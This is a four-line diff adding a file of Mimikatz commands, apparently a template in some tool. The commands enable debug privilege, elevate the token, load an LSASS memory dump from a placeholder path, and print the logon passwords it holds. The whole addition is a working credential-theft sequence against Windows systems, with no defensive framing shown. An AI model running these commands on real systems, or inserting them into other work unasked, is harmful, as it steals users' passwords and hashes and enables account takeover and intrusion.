@@ -1,0 +1,4 @@
+privilege::debug
+token::elevate
+sekurlsa::minidump {path}
+sekurlsa::logonpasswords
